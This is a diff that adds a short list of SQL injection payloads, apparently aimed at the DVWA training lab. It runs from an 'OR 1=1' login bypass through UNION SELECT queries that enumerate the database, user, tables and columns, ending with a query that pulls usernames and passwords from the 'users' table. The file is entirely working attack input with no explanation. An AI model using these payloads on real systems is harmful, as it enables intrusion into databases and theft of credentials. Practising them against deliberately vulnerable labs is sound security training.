@@ -1,0 +1,7 @@
+' OR '1'='1
+1' OR '1'='1 #
+1' UNION SELECT NULL, NULL #
+1' UNION SELECT database(), user() #
+1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa' #
+1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
+1' UNION SELECT user, password FROM users #
